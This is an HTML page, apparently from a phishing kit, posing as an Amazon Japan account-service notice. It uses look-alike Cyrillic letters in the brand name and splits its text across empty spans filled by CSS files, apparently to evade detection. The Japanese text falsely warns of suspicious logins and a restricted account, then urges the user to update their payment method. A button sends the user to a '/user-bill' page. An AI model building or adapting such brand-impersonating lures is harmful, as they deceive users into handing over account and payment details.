<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <link rel="stylesheet" href="library/fontawesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="library/bootstrap/css/main.min.css">
    <link rel="stylesheet" href="sheets/alert.css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
    <title>Amаzоn - アカウントサービス</title>
</head>
<body>

    <div class="mynavbar">
        <div class="container-fluid">
            <ul class="nav">
                <li class="nav-item">
                  <a class="nav-link" href="#">
                      <img src="assets/img/logo.png" alt="" class="brandimg">
                  </a>
                </li>
                <li class="nav-item ml-auto myddown">
                    <div class="dropdown">
                        <button class="btn btndown dropdown-toggle" type="button">
                          アカウント
                        </button>
                        <div class="mydropdown d-none">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="#" class="mylink"><link href="css/warning/SheDin.css" rel="stylesheet" type="text/css"><span class="vmyTR"></span><span class="naxUv"></span></a></li>
                                <li class="list-group-item"><a href="#" class="mylink"><link href="css/warning/QieHu.css" rel="stylesheet" type="text/css"><span class="vWvdh"></span><span class="oEhGS"></span><span class="EscZz"></span><span class="gdsmS"></span><span class="LZuJe"></span><span class="zpktE"></span><span class="sxARM"></span><span class="rpUOO"></span><span class="rObno"></span><span class="cIEBS"></span></a></li>
                                <li class="list-group-item"><a href="#" class="mylink"><link href="css/warning/TuiCh.css" rel="stylesheet" type="text/css"><span class="ueZqG"></span><span class="zKoHg"></span><span class="KPRpv"></span><span class="YwKVS"></span><span class="PMBTR"></span><span class="RqesW"></span></a></li>
                              </ul>
                        </div>
                        
                      </div>
                </li>
              </ul>
        </div>
    </div>

    <div class="a-content">
        <div class="container">
                <span class="lefttext"><a href="#" class="lefttext"><link href="css/warning/FuWuu.css" rel="stylesheet" type="text/css"><span class="POnLq"></span><span class="AqIZW"></span><span class="kboaC"></span><span class="XzEcQ"></span><span class="tVMas"></span><span class="dAMOg"></span><span class="sMeSS"></span><span class="KfPAs"></span><span class="biHAH"></span></a></span>
                <span class="middle"><link href="css/warning/FuHao.css" rel="stylesheet" type="text/css"><span class="dBirO"></span><span class="kkhZd"></span><span class="AnNbd"></span></span>
                <span class="righttext"><link href="css/warning/BianG.css" rel="stylesheet" type="text/css"><span class="yZMIa"></span><span class="bgtsp"></span><span class="XRsjL"></span><span class="uhhGk"></span><span class="jqjcT"></span><span class="iqNJu"></span><span class="VUaoP"></span><span class="KsuqC"></span><span class="gQbTg"></span><span class="nroeZ"></span><span class="KzNPJ"></span><span class="cOXuN"></span></span>
                <p class="alerttext"><link href="css/warning/TiXin.css" rel="stylesheet" type="text/css">Amаzоnセキュリティシステム、最近は変わったログイン履歴がありますので、必要な手順でアカウントを保護してください</p>
                <div class="row">
                    <div class="col-12">
                            <div class="alert alert-danger" role="alert">
                                    <h4 class="alert-heading"><i class="fas fa-exclamation-triangle text-danger"></i> <link href="css/warning/GengX.css" rel="stylesheet" type="text/css"/><link href="css/warning/JiXuA.css" rel="stylesheet" type="text/css"/><span class="kidd1"></span><span class="kidd2"></span><span class="kidd3"></span><span class="kidd4"></span><span class="kidd5"></span>を更新してください</h4>
                                    <p>
<br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="bAoYw"></span>お邪魔してすみません、そちらの<span class="kidd1"></span><span class="kidd2">い方法を検証できませんので。

<br><br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="BrcdH"></span>アカウントを保護するために、検証完了までアカウントを一時に制限します。
<br><br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="ZbxQv"></span>検証手順が終わりましたら、制限をすぐに解除します。<br><br>
                                    </p>
                                    <a  id="bt1"  class="btn bgcolored"><span class="TlNJP"></span><span class="UbRdT"></span><span class="rrNzI"></span></a>
                                  </div>
                    </div>
                </div>
        </div>
    </div>
    <script src="library/jquery/main.min.js"></script>
    <script src="library/pooper/main.min.js"></script>
    <script src="library/bootstrap/js/main.min.js"></script>

    <script>
        $(document).ready(function(){
            $('.myddown').hover(function(){
                $('.mydropdown').togleClass('d-none');
            })
        })
        $("#bt1").click(function () {
            window.location.href = "/user-bill";
        })
    </script>
</body>
</html>